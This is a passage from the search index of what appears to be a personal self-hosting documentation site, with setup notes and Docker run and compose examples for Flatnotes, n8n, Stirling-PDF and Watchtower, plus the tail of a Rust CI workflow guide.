main() {\n    println!(\"Hello from Rust!\");\n}\n</code></pre> <p>Note that this workflow did have to manually install <code>rustup</code> whereas that is installed in the GitHub Runners by default. This is because our <code>node:20</code> docker image doesn't have <code>rustup</code> installed by default. <code>nektos/act</code> also has more extensive docker images, but those are multiple GB in size. The <code>nektos/act-environments-ubuntu:18.04-full</code>, for example, is 12.1 GB.</p> <p>When pushing these changes to the repository, the workflow should run and print \"Hello from Rust!\" in the last step.</p> <p>At this point, you have a fully functional personal forge with a runner \ud83c\udf89\ud83c\udf89.</p>"},{"location":"mdEditor/flatnotes/","title":"Flatnotes","text":"<p>A self-hosted, database-less note-taking web app that utilises a flat folder of markdown files for storage.</p> <p>Log into the demo site and take a look around. Note: This site resets every 15 minutes.</p>"},{"location":"mdEditor/flatnotes/#contents","title":"Contents","text":"<ul> <li>Design Principle</li> <li>Features</li> <li>Getting Started</li> <li>Hosted</li> <li>Self Hosted</li> <li>Roadmap</li> <li>Sponsorship</li> <li>Thanks</li> </ul>"},{"location":"mdEditor/flatnotes/#design-principle","title":"Design Principle","text":"<p>flatnotes is designed to be a distraction-free note-taking app that puts your note content first. This means:</p> <ul> <li>A clean and simple user interface.</li> <li>No folders, notebooks or anything like that. Just all of your notes, backed by powerful search and tagging functionality.</li> <li>Quick access to a full-text search from anywhere in the app (keyboard shortcut \"/\").</li> </ul> <p>Another key design principle is not to take your notes hostage. Your notes are just markdown files. There's no database, proprietary formatting, complicated folder structures or anything like that. You're free at any point to just move the files elsewhere and use another app.</p> <p>Equally, the only thing flatnotes caches is the search index and that's incrementally synced on every search (and when flatnotes first starts). This means that you're free to add, edit &amp; delete the markdown files outside of flatnotes even whilst flatnotes is running.</p>"},{"location":"mdEditor/flatnotes/#features","title":"Features","text":"<ul> <li>Mobile responsive web interface.</li> <li>Raw/WYSIWYG markdown editor modes.</li> <li>Advanced search functionality.</li> <li>Note \"tagging\" functionality.</li> <li>Wikilink support to easily link to other notes (<code>[[My Other Note]]</code>).</li> <li>Light/dark themes.</li> <li>Multiple authentication options (none, read-only, username/password, 2FA).</li> <li>Restful API.</li> </ul> <p>See the wiki for more details.</p>"},{"location":"mdEditor/flatnotes/#getting-started","title":"Getting Started","text":""},{"location":"mdEditor/flatnotes/#hosted","title":"Hosted","text":"<p>A quick and easy way to get started with flatnotes is to host it on PikaPods. Just click the button below and follow the instructions.</p> <p></p>"},{"location":"mdEditor/flatnotes/#self-hosted","title":"Self Hosted","text":"<p>If you'd prefer to host flatnotes yourself then the recommendation is to use Docker.</p>"},{"location":"mdEditor/flatnotes/#example-docker-run-command","title":"Example Docker Run Command","text":"<pre><code>docker run -d \\\n  -e \"PUID=1000\" \\\n  -e \"PGID=1000\" \\\n  -e \"FLATNOTES_AUTH_TYPE=password\" \\\n  -e \"FLATNOTES_USERNAME=user\" \\\n  -e \"FLATNOTES_PASSWORD=changeMe!\" \\\n  -e \"FLATNOTES_SECRET_KEY=aLongRandomSeriesOfCharacters\" \\\n  -v \"$(pwd)/data:/data\" \\\n  -p \"8080:8080\" \\\n  dullage/flatnotes:latest\n</code></pre>"},{"location":"mdEditor/flatnotes/#example-docker-compose","title":"Example Docker Compose","text":"<pre><code>version: \"3\"\n\nservices:\n  flatnotes:\n    container_name: flatnotes\n    image: dullage/flatnotes:latest\n    environment:\n      PUID: 1000\n      PGID: 1000\n      FLATNOTES_AUTH_TYPE: \"password\"\n      FLATNOTES_USERNAME: \"user\"\n      FLATNOTES_PASSWORD: \"changeMe!\"\n      FLATNOTES_SECRET_KEY: \"aLongRandomSeriesOfCharacters\"\n    volumes:\n      - \"./data:/data\"\n      # Optional. Allows you to save the search index in a different location: \n      # - \"./index:/data/.flatnotes\"\n    ports:\n      - \"8080:8080\"\n    restart: unless-stopped\n</code></pre> <p>See the Environment Variables article in the wiki for a full list of configuration options.</p>"},{"location":"mdEditor/flatnotes/#roadmap","title":"Roadmap","text":"<p>I want to keep flatnotes as simple and distraction-free as possible which means limiting new features. This said, I welcome feedback and suggestions.</p>"},{"location":"mdEditor/flatnotes/#sponsorship","title":"Sponsorship","text":"<p>If you find this project useful, please consider buying me a beer. It would genuinely make my day.</p> <p></p>"},{"location":"mdEditor/flatnotes/#thanks","title":"Thanks","text":"<p>A special thanks to 2 fantastic open-source projects that make flatnotes possible.</p> <ul> <li>Whoosh - A fast, pure Python search engine library.</li> <li>TOAST UI Editor - A GFM Markdown and WYSIWYG editor for the browser.</li> </ul>"},{"location":"n8n/compose/","title":"Compose","text":"<pre><code>version: \"3.7\"\n\nservices:\n  n8n:\n    image: docker.n8n.io/n8nio/n8n\n    restart: always\n    ports:\n      - \"5678:5678\"\n    environment:\n      - N8N_HOST=n8n.madolell.com\n      - N8N_PORT=5678\n      - N8N_PROTOCOL=https\n      - NODE_ENV=production\n      - WEBHOOK_URL=https://n8n.madolell.com/\n      - GENERIC_TIMEZONE=Europe/Madrid\n    volumes:\n      - n8n_data:/home/node/.n8n\n      - ./n8n_files:/files\n\nvolumes:\n  n8n_data:\n    external: true\n</code></pre>"},{"location":"n8n/install%28docker%29/","title":"Install(docker)","text":"<p>Hosting n8nInstallation</p>"},{"location":"n8n/install%28docker%29/#docker-installation","title":"Docker Installation#","text":"<p>Docker offers the following advantages:</p> <ul> <li>Install n8n in a clean environment.</li> <li>Easier setup for your preferred database.</li> <li>Can avoid issues due to different operating systems, as Docker provides a consistent system.</li> </ul>"},{"location":"n8n/install%28docker%29/#prerequisites","title":"Prerequisites#","text":"<p>Before proceeding, install Docker Desktop.</p> <p>Linux Users</p> <p>Docker Desktop is available for Mac and Windows. Linux users must install Docker Engine and Docker Compose individually for your distribution.</p> <p>Self-hosting knowledge prerequisites</p> <p>Self-hosting n8n requires technical knowledge, including:</p> <ul> <li>Setting up and configuring servers and containers</li> <li>Managing application resources and scaling</li> <li>Securing servers and applications</li> <li>Configuring n8n</li> </ul> <p>n8n recommends self-hosting for expert users. Mistakes can lead to data loss, security issues, and downtime. If you aren't experienced at managing servers, n8n recommends n8n Cloud.</p> <p>Latest and Next versions</p> <p>n8n releases a new minor version most weeks. The <code>latest</code> version is for production use. <code>next</code> is the most recent release. You should treat <code>next</code> as a beta: it may be unstable. To report issues, use the forum.</p> <p>Current <code>latest</code>: 1.15.2 Current <code>next</code>: 1.16.0</p>"},{"location":"n8n/install%28docker%29/#starting-n8n","title":"Starting n8n#","text":"<p>From your terminal, run:</p> <code>1 2 3</code> <code>docker volume create n8n_data docker run -it --rm --name n8n -p 5678:5678 -v n8n_data:/home/node/.n8n docker.n8n.io/n8nio/n8n</code> <p>This command will download all required n8n images and start your container, exposed on port <code>5678</code>. To save your work between container restarts, it also mounts a docker volume, <code>n8n_data</code>, to persist your data locally.</p> <p>You can then access n8n by opening: http://localhost:5678</p>"},{"location":"n8n/install%28docker%29/#using-alternate-databases","title":"Using alternate databases#","text":"<p>By default n8n uses SQLite to save credentials, past executions and workflows. n8n also supports PostgresDB configurable using environment variables as detailed below.</p> <p>It's important to still persist data in the <code>/home/node/.n8n</code> folder as it contains n8n user data and even more importantly the encryption key for credentials. It's also the name of the webhook when the n8n tunnel is used.</p> <p>If no directory is found, n8n creates automatically one on startup. In this case, existing credentials saved with a different encryption key can not be used anymore.</p> <p>Keep in mind</p> <p>Persisting the <code>/home/node/.n8n</code> directory even when using alternate databases is the recommended best practice, but not explicitly required. The encryption key can be provided via the <code>N8N_ENCRYPTION_KEY</code> environment variable.</p>"},{"location":"n8n/install%28docker%29/#postgresdb","title":"PostgresDB#","text":"<p>To use n8n with Postgres, provide the corresponding configuration:</p> <code>1 2 3 4 5 6 7 8 9 10 11 12 13 14</code> <code>docker volume create n8n_data docker run -it --rm \\ --name n8n \\ -p 5678:5678 \\ -e DB_TYPE=postgresdb \\ -e DB_POSTGRESDB_DATABASE=&lt;POSTGRES_DATABASE&gt; \\ -e DB_POSTGRESDB_HOST=&lt;POSTGRES_HOST&gt; \\ -e DB_POSTGRESDB_PORT=&lt;POSTGRES_PORT&gt; \\ -e DB_POSTGRESDB_USER=&lt;POSTGRES_USER&gt; \\ -e DB_POSTGRESDB_SCHEMA=&lt;POSTGRES_SCHEMA&gt; \\ -e DB_POSTGRESDB_PASSWORD=&lt;POSTGRES_PASSWORD&gt; \\ -v n8n_data:/home/node/.n8n \\ docker.n8n.io/n8nio/n8n</code> <p>A complete <code>docker-compose</code> file for Postgres can be found here.</p>"},{"location":"n8n/install%28docker%29/#mysql","title":"MySQL#","text":"<p>Deprecated</p> <p>n8n deprecated MySQL and MariaDB as backend databases in version 0.227.0.</p> <p>n8n recommends using PostgreSQL.</p> <p>Refer to how to export and import workflows and credentials for instructions.</p> <p>To use n8n with MySQL, provide the corresponding configuration:</p> <code>1 2 3 4 5 6 7 8 9 10 11 12 13</code> <code>docker volume create n8n_data docker run -it --rm \\ --name n8n \\ -p 5678:5678 \\ -e DB_TYPE=mysqldb \\ -e DB_MYSQLDB_DATABASE=&lt;MYSQLDB_DATABASE&gt; \\ -e DB_MYSQLDB_HOST=&lt;MYSQLDB_HOST&gt; \\ -e DB_MYSQLDB_PORT=&lt;MYSQLDB_PORT&gt; \\ -e DB_MYSQLDB_USER=&lt;MYSQLDB_USER&gt; \\ -e DB_MYSQLDB_PASSWORD=&lt;MYSQLDB_PASSWORD&gt; \\ -v n8n_data:/home/node/.n8n \\ docker.n8n.io/n8nio/n8n</code>"},{"location":"n8n/install%28docker%29/#setting-timezone","title":"Setting timezone#","text":"<p>To define the timezone n8n should use, the environment variable <code>GENERIC_TIMEZONE</code> can be set. This gets used by schedule based nodes such as the Cron node.</p> <p>The timezone of the system can also be set separately. This controls what some scripts and commands return like <code>$ date</code>. The system timezone can be set via the environment variable <code>TZ</code>.</p> <p>Example using the same timezone for both:</p> <code>1 2 3 4 5 6 7 8 9</code> <code>docker volume create n8n_data docker run -it --rm \\ --name n8n \\ -p 5678:5678 \\ -e GENERIC_TIMEZONE=\"Europe/Berlin\" \\ -e TZ=\"Europe/Berlin\" \\ -v n8n_data:/home/node/.n8n \\ docker.n8n.io/n8nio/n8n</code>"},{"location":"n8n/install%28docker%29/#updating","title":"Updating#","text":"<p>From your Docker Desktop, navigate to the Images tab and select Pull from the context menu to download the latest n8n image:</p> <p></p> <p>You can also use the command line to pull the latest, or a specific version:</p> <code>1 2 3 4 5 6 7 8</code> <code># Pull latest (stable) version docker pull docker.n8n.io/n8nio/n8n # Pull specific version docker pull docker.n8n.io/n8nio/n8n:0.220.1 # Pull next (unstable) version docker pull docker.n8n.io/n8nio/n8n:next</code> <p>Stop the container and start it again. You can also use the command line:</p> <code>1 2 3 4 5 6 7 8 9 10 11</code> <code># Get the container ID docker ps -a # Stop the container with ID container_id docker stop [container_id] # Remove the container with ID container_id docker rm [container_id] # Start the container docker run --name=[container_name] [options] -d docker.n8n.io/n8nio/n8n</code>"},{"location":"n8n/install%28docker%29/#docker-compose","title":"Docker Compose#","text":"<p>If you run n8n using a Docker Compose file, follow these steps to update n8n:</p> <code>1 2 3 4 5 6 7 8</code> <code># Pull latest version docker compose pull # Stop and remove older version docker compose down # Start the container docker compose up -d</code>"},{"location":"n8n/install%28docker%29/#further-reading","title":"Further reading#","text":"<p>More information about Docker setup can be found in the README file of the Docker Image.</p>"},{"location":"n8n/install%28docker%29/#n8n-with-tunnel","title":"n8n with tunnel#","text":"<p>Danger</p> <p>This is only meant for local development and testing. Do not use it in production.</p> <p>To be able to use webhooks for trigger nodes of external services like GitHub, n8n has to be reachable from the web. To make that easy, n8n has a special tunnel service which redirects requests from our servers to your local n8n instance.</p> <p>Start n8n with <code>--tunnel</code> by running:</p> <code>1 2 3 4 5 6 7 8</code> <code>docker volume create n8n_data docker run -it --rm \\ --name n8n \\ -p 5678:5678 \\ -v n8n_data:/home/node/.n8n \\ docker.n8n.io/n8nio/n8n \\ start --tunnel</code>"},{"location":"pdf/pdf-editor/","title":"Pdf editor","text":"<p>Stirling-PDF </p> <p> </p> <p></p> <p>This is a powerful locally hosted web based PDF manipulation tool using docker that allows you to perform various operations on PDF files, such as splitting merging, converting, reorganizing, adding images, rotating, compressing, and more. This locally hosted web application started as a 100% ChatGPT-made application and has evolved to include a wide range of features to handle all your PDF needs.</p> <p>Stirling PDF makes no outbound calls for any record keeping or tracking.</p> <p>All files and PDFs exist either exclusively on the client side, reside in server memory only during task execution, or temporarily reside in a file solely for the execution of the task. Any file downloaded by the user will have been deleted from the server by that point.</p> <p></p>"},{"location":"pdf/pdf-editor/#features","title":"Features","text":"<ul> <li>Dark mode support.</li> <li>Custom download options (see here for example)</li> <li>Parallel file processing and downloads</li> <li>API for integration with external scripts</li> <li>Optional Login and Authentication support (see here for documentation)</li> </ul>"},{"location":"pdf/pdf-editor/#pdf-features","title":"PDF Features","text":""},{"location":"pdf/pdf-editor/#page-operations","title":"Page Operations","text":"<ul> <li>View and modify PDFs - View multi page PDFs with custom viewing sorting and searching. Plus on page edit features like annotate, draw and adding text and images. (Using PDF.js with Joxit and Liberation.Liberation fonts)</li> <li>Full interactive GUI for merging/splitting/rotating/moving PDFs and their pages.</li> <li>Merge multiple PDFs together into a single resultant file.</li> <li>Split PDFs into multiple files at specified page numbers or extract all pages as individual files.</li> <li>Reorganize PDF pages into different orders.</li> <li>Rotate PDFs in 90-degree increments.</li> <li>Remove pages.</li> <li>Multi-page layout (Format PDFs into a multi-paged page).</li> <li>Scale page contents size by set %.</li> <li>Adjust Contrast.</li> <li>Crop PDF.</li> <li>Auto Split PDF (With physically scanned page dividers).</li> <li>Extract page(s).</li> <li>Convert PDF to a single page.</li> </ul>"},{"location":"pdf/pdf-editor/#conversion-operations","title":"Conversion Operations","text":"<ul> <li>Convert PDFs to and from images.</li> <li>Convert any common file to PDF (using LibreOffice).</li> <li>Convert PDF to Word/Powerpoint/Others (using LibreOffice).</li> <li>Convert HTML to PDF.</li> <li>URL to PDF.</li> <li>Markdown to PDF.</li> </ul>"},{"location":"pdf/pdf-editor/#security-permissions","title":"Security &amp; Permissions","text":"<ul> <li>Add and remove passwords.</li> <li>Change/set PDF Permissions.</li> <li>Add watermark(s).</li> <li>Certify/sign PDFs.</li> <li>Sanitize PDFs.</li> <li>Auto-redact text.</li> </ul>"},{"location":"pdf/pdf-editor/#other-operations","title":"Other Operations","text":"<ul> <li>Add/Generate/Write signatures.</li> <li>Repair PDFs.</li> <li>Detect and remove blank pages.</li> <li>Compare 2 PDFs and show differences in text.</li> <li>Add images to PDFs.</li> <li>Compress PDFs to decrease their filesize (Using OCRMyPDF).</li> <li>Extract images from PDF.</li> <li>Extract images from Scans.</li> <li>Add page numbers.</li> <li>Auto rename file by detecting PDF header text.</li> <li>OCR on PDF (Using OCRMyPDF).</li> <li>PDF/A conversion (Using OCRMyPDF).</li> <li>Edit metadata.</li> <li>Flatten PDFs.</li> <li>Get all information on a PDF to view or export as JSON.</li> </ul> <p>For a overview of the tasks and the technology each uses please view Endpoint-groups.md Demo of the app is available here. username: demo, password: demo</p>"},{"location":"pdf/pdf-editor/#technologies-used","title":"Technologies used","text":"<ul> <li>Spring Boot + Thymeleaf</li> <li>PDFBox</li> <li>LibreOffice for advanced conversions</li> <li>OcrMyPdf</li> <li>HTML, CSS, JavaScript</li> <li>Docker</li> <li>PDF.js</li> <li>PDF-LIB.js</li> </ul>"},{"location":"pdf/pdf-editor/#how-to-use","title":"How to use","text":""},{"location":"pdf/pdf-editor/#locally","title":"Locally","text":"<p>Please view https://github.com/Stirling-Tools/Stirling-PDF/blob/main/LocalRunGuide.md</p>"},{"location":"pdf/pdf-editor/#docker-podman","title":"Docker / Podman","text":"<p>https://hub.docker.com/r/frooodle/s-pdf</p> <p>Stirling PDF has 3 different versions, a Full version, Lite, and ultra-Lite. Depending on the types of features you use you may want a smaller image to save on space. To see what the different versions offer please look at our version mapping For people that don't mind about space optimization just use the latest tag.  </p> <p>Docker Run</p> <pre><code>docker run -d \\\n  -p 8080:8080 \\\n  -v /location/of/trainingData:/usr/share/tessdata \\\n  -v /location/of/extraConfigs:/configs \\\n  -v /location/of/logs:/logs \\\n  -e DOCKER_ENABLE_SECURITY=false \\\n  --name stirling-pdf \\\n  frooodle/s-pdf:latest\n\n\n  Can also add these for customisation but are not required\n\n  -v /location/of/customFiles:/customFiles \\\n</code></pre> <p>Docker Compose</p> <pre><code>version: '3.3'\nservices:\n  stirling-pdf:\n    image: frooodle/s-pdf:latest\n    ports:\n      - '8080:8080'\n    volumes:\n      - /location/of/trainingData:/usr/share/tessdata #Required for extra OCR languages\n      - /location/of/extraConfigs:/configs\n#      - /location/of/customFiles:/customFiles/\n#      - /location/of/logs:/logs/\n    environment:\n      - DOCKER_ENABLE_SECURITY=false\n</code></pre> <p>Note: Podman is CLI-compatible with Docker, so simply replace \"docker\" with \"podman\".</p>"},{"location":"pdf/pdf-editor/#enable-ocrcompression-feature","title":"Enable OCR/Compression feature","text":"<p>Please view https://github.com/Stirling-Tools/Stirling-PDF/blob/main/HowToUseOCR.md</p>"},{"location":"pdf/pdf-editor/#supported-languages","title":"Supported Languages","text":"<p>Stirling PDF currently supports 26! - English (English) (en_GB) - English (US) (en_US) - Arabic (\u0627\u0644\u0639\u0631\u0628\u064a\u0629) (ar_AR) - German (Deutsch) (de_DE) - French (Fran\u00e7ais) (fr_FR) - Spanish (Espa\u00f1ol) (es_ES) - Simplified Chinese (\u7b80\u4f53\u4e2d\u6587) (zh_CN) - Traditional Chinese (\u7e41\u9ad4\u4e2d\u6587) (zh_TW) - Catalan (Catal\u00e0) (ca_CA) - Italian (Italiano) (it_IT) - Swedish (Svenska) (sv_SE) - Polish (Polski) (pl_PL) - Romanian (Rom\u00e2n\u0103) (ro_RO) - Korean (\ud55c\uad6d\uc5b4) (ko_KR) - Portuguese Brazilian (Portugu\u00eas) (pt_BR) - Russian (\u0420\u0443\u0441\u0441\u043a\u0438\u0439) (ru_RU) - Basque (Euskara) (eu_ES) - Japanese (\u65e5\u672c\u8a9e) (ja_JP) - Dutch (Nederlands) (nl_NL) - Greek (el_GR) - Turkish (T\u00fcrk\u00e7e) (tr_TR) - Indonesia (Bahasa Indonesia) (id_ID) - Hindi (\u0939\u093f\u0902\u0926\u0940) (hi_IN) - Hungarian (Magyar) (hu_HU) - Bulgarian (\u0411\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0438) (bg_BG) - Sebian Latin alphabet (Srpski) (sr_LATN_RS)</p>"},{"location":"pdf/pdf-editor/#contributing-creating-issues-translations-fixing-bugs-etc","title":"Contributing (creating issues, translations, fixing bugs, etc.)","text":"<p>Please see our Contributing Guide!</p>"},{"location":"pdf/pdf-editor/#customisation","title":"Customisation","text":"<p>Stirling PDF allows easy customization of the app. Includes things like - Custom application name - Custom slogans, icons, images, and even custom HTML (via file overrides)</p> <p>There are two options for this, either using the generated settings file <code>settings.yml</code> This file is located in the <code>/configs</code> directory and follows standard YAML formatting</p> <p>Environment variables are also supported and would override the settings file For example in the settings.yml you have</p> <pre><code>system:\n  defaultLocale: 'en-US'\n</code></pre> <p>To have this via an environment variable you would have <code>SYSTEM_DEFAULTLOCALE</code></p> <p>The Current list of settings is</p> <pre><code>security:\n  enableLogin: false # set to 'true' to enable login\n  csrfDisabled: true\n\nsystem:\n  defaultLocale: 'en-US' # Set the default language (e.g. 'de-DE', 'fr-FR', etc)\n  googlevisibility: false # 'true' to allow Google visibility (via robots.txt), 'false' to disallow\n  customStaticFilePath: '/customFiles/static/' # Directory path for custom static files\n\n#ui:\n#  appName: exampleAppName # Application's visible name\n#  homeDescription: I am a description # Short description or tagline shown on homepage.\n#  appNameNavbar: navbarName # Name displayed on the navigation bar\n\nendpoints:\n  toRemove: [] # List endpoints to disable (e.g. ['img-to-pdf', 'remove-pages'])\n  groupsToRemove: [] # List groups to disable (e.g. ['LibreOffice'])\n\nmetrics:\n  enabled: true # 'true' to enable Info APIs endpoints (view http://localhost:8080/swagger-ui/index.html#/API to learn more), 'false' to disable\n</code></pre>"},{"location":"pdf/pdf-editor/#extra-notes","title":"Extra notes","text":"<ul> <li>Endpoints. Currently, the endpoints ENDPOINTS_TO_REMOVE and GROUPS_TO_REMOVE can include comma separate lists of endpoints and groups to disable as example ENDPOINTS_TO_REMOVE=img-to-pdf,remove-pages would disable both image-to-pdf and remove pages, GROUPS_TO_REMOVE=LibreOffice Would disable all things that use LibreOffice. You can see a list of all endpoints and groups here</li> <li>customStaticFilePath. Customise static files such as the app logo by placing files in the /customFiles/static/ directory. An example of customising app logo is placing a /customFiles/static/favicon.svg to override current SVG. This can be used to change any images/icons/css/fonts/js etc in Stirling-PDF</li> </ul>"},{"location":"pdf/pdf-editor/#environment-only-parameters","title":"Environment only parameters","text":"<ul> <li><code>SYSTEM_ROOTURIPATH</code> ie set to <code>/pdf-app</code> to Set the application's root URI to <code>localhost:8080/pdf-app</code></li> <li><code>SYSTEM_CONNECTIONTIMEOUTMINUTES</code> to set custom connection timeout values</li> <li><code>DOCKER_ENABLE_SECURITY</code> to tell docker to download security jar (required as true for auth login)</li> </ul>"},{"location":"pdf/pdf-editor/#api","title":"API","text":"<p>For those wanting to use Stirling-PDFs backend API to link with their own custom scripting to edit PDFs you can view all existing API documentation here or navigate to /swagger-ui/index.html of your stirling-pdf instance for your versions documentation (Or by following the API button in your settings of Stirling-PDF)</p>"},{"location":"pdf/pdf-editor/#login-authentication","title":"Login authentication","text":""},{"location":"pdf/pdf-editor/#prerequisites","title":"Prerequisites:","text":"<ul> <li>User must have the folder ./configs volumed within docker so that it is retained during updates.</li> <li>Docker uses must download the security jar version by setting <code>DOCKER_ENABLE_SECURITY</code> to <code>true</code> in environment variables.</li> <li>Then either enable login via the settings.yml file or via setting <code>SECURITY_ENABLE_LOGIN</code> to <code>true</code></li> <li>Now the initial user will be generated with username <code>admin</code> and password <code>stirling</code>. On login you will be forced to change the password to a new one. You can also use the environment variables <code>SECURITY_INITIALLOGIN_USERNAME</code> and  <code>SECURITY_INITIALLOGIN_PASSWORD</code> to set your own straight away (Recommended to remove them after user creation).</li> </ul> <p>Once the above has been done, on restart, a new stirling-pdf-DB.mv.db will show if everything worked.</p> <p>When you login to Stirling PDF you will be redirected to /login page to login with those default credentials. After login everything should function as normal</p> <p>To access your account settings go to Account settings in the settings cog menu (top right in navbar) This Account settings menu is also where you find your API key.</p> <p>To add new users go to the bottom of Account settings and hit 'Admin Settings', here you can add new users. The different roles mentioned within this are for rate limiting. This is a Work in progress which will be expanding on more in future</p> <p>For API usage you must provide a header with 'X-API-Key' and the associated API key for that user.</p>"},{"location":"pdf/pdf-editor/#faq","title":"FAQ","text":""},{"location":"pdf/pdf-editor/#q1-what-are-your-planned-features","title":"Q1: What are your planned features?","text":"<ul> <li>Progress bar/Tracking</li> <li>Full custom logic pipelines to combine multiple operations together.</li> <li>Folder support with auto scanning to perform operations on</li> <li>Redact text (Via UI not just automated way)</li> <li>Add Forms</li> <li>Multi page layout (Stich PDF pages together) support x rows y columns and custom page sizing</li> <li>Fill forms manually or automatically</li> </ul>"},{"location":"pdf/pdf-editor/#q2-why-is-my-application-downloading-htm-files","title":"Q2: Why is my application downloading .htm files?","text":"<p>This is an issue caused commonly by your NGINX configuration. The default file upload size for NGINX is 1MB, you need to add the following in your Nginx sites-available file. <code>client_max_body_size SIZE;</code> Where \"SIZE\" is 50M for example for 50MB files.</p>"},{"location":"pdf/pdf-editor/#q3-why-is-my-download-timing-out","title":"Q3: Why is my download timing out","text":"<p>NGINX has timeout values by default so if you are running Stirling-PDF behind NGINX you may need to set a timeout value such as adding the config <code>proxy_read_timeout 3600;</code></p>"},{"location":"watchover%28docker%29/docker-compose/","title":"Docker compose","text":"<pre><code>version: \"3.4\"\nservices:\n  watchtower:\n    image: containrrr/watchtower:latest\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n      - ~/.docker/config.json:/config.json\n    command: --interval 15\n</code></pre>"}]}